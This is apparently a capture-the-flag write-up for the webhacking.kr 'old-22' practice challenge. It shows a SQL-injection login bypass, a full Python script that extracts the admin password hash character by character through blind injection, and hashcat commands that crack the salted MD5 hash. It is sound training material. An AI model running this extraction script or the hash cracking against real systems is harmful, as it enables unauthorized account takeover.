# Old 22    SQLi (Password+Salt)

URL: [https://webhacking.kr/challenge/bonus-2/index.php](https://webhacking.kr/challenge/bonus-2/index.php)

![old-22.png](/assets/ctf/webhacking.kr/old-22.png)

I registered using `x:y` credentials, upon `login` we get password hash:

![old-22-1.png](/assets/ctf/webhacking.kr/old-22-1.png)

Password is `md5(password+salt)` and `salt="apple"`

![old-22-2.png](/assets/ctf/webhacking.kr/old-22-2.png)

Following payload logs us in, but we can't login because of password check
```sql
admin' -- -
```

Brute the password hash:
```python
import asyncio
from aiohttp import ClientSession
import string

URL = 'https://webhacking.kr/challenge/bonus-2/index.php'
CHARSET = string.ascii_letters + string.digits + '{}?!,_'
COOKIES = {'PHPSESSID': 'hi4uvai5sde90encr0ktq6879f'}
PAYLOAD = "admin'&&SUBSTR(pw,{},1)='{}' #"
SUCCESS = 'Wrong password!'


async def fetch(session, payload):
    async with session.post(URL, cookies=COOKIES, data={'uuid': payload, 'pw': 'letmein'}) as resp:
        return SUCCESS in await resp.text()


async def main():
    async with ClientSession() as session:
        password = '6c9ca386a903921d7fa230ffa0ffc153'
        while True:
            password_i = len(password) + 1
            print(f'\r{password=}', end='')
            tasks = [
                fetch(session, PAYLOAD.format(password_i, c)) 
                for c in CHARSET
            ]
            results = await asyncio.gather(*tasks)
            for i, result in enumerate(results):
                if result:
                    password += CHARSET[i]
                    break
            else:
                break
    print()

if __name__ == '__main__':
    asyncio.run(main())
```

Crack station didn't have this hash, so use hashcat to recover the password:

```powershell
➜ cat .\hashes
6c9ca386a903921d7fa230ffa0ffc153:apple # Hash:Salt
➜ .\hashcat.exe --show hashes         # Get possible modes
The following 20 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
     10 | md5($pass.$salt)                                           | Raw Hash salted and/or iterated
     20 | md5($salt.$pass)                                           | Raw Hash salted and/or iterated
   3800 | md5($salt.$pass.$salt)                                     | Raw Hash salted and/or iterated
   3710 | md5($salt.md5($pass))                                      | Raw Hash salted and/or iterated
   4110 | md5($salt.md5($pass.$salt))                                | Raw Hash salted and/or iterated
   4010 | md5($salt.md5($salt.$pass))                                | Raw Hash salted and/or iterated
  21300 | md5($salt.sha1($salt.$pass))                               | Raw Hash salted and/or iterated
     40 | md5($salt.utf16le($pass))                                  | Raw Hash salted and/or iterated
   3910 | md5(md5($pass).md5($salt))                                 | Raw Hash salted and/or iterated
   4410 | md5(sha1($pass).$salt)                                     | Raw Hash salted and/or iterated
  21200 | md5(sha1($salt).md5($pass))                                | Raw Hash salted and/or iterated
     30 | md5(utf16le($pass).$salt)                                  | Raw Hash salted and/or iterated
     50 | HMAC-MD5 (key = $pass)                                     | Raw Hash authenticated
     60 | HMAC-MD5 (key = $salt)                                     | Raw Hash authenticated
   1100 | Domain Cached Credentials (DCC), MS Cache                  | Operating System
     12 | PostgreSQL                                                 | Database Server
   2811 | MyBB 1.2+, IPB2+ (Invision Power Board)                    | Forums, CMS, E-Commerce
   2611 | vBulletin < v3.8.5                                         | Forums, CMS, E-Commerce
   2711 | vBulletin >= v3.8.5                                        | Forums, CMS, E-Commerce
     23 | Skype                                                      | Instant Messaging Service
➜ .\hashcat.exe -a 0 -m 10 hashes .\rockyou.txt # Recover
hashcat (v6.2.6) starting
...
6c9ca386a903921d7fa230ffa0ffc153:apple:wow
...
```

> Creds: `admin:wow`

![old-22-3.png](/assets/ctf/webhacking.kr/old-22-3.png)

---

[md5hashing.net](https://md5hashing.net/hash/md5/6c9ca386a903921d7fa230ffa0ffc153) had this hash:

![old-22-4.png](/assets/ctf/webhacking.kr/old-22-4.png)

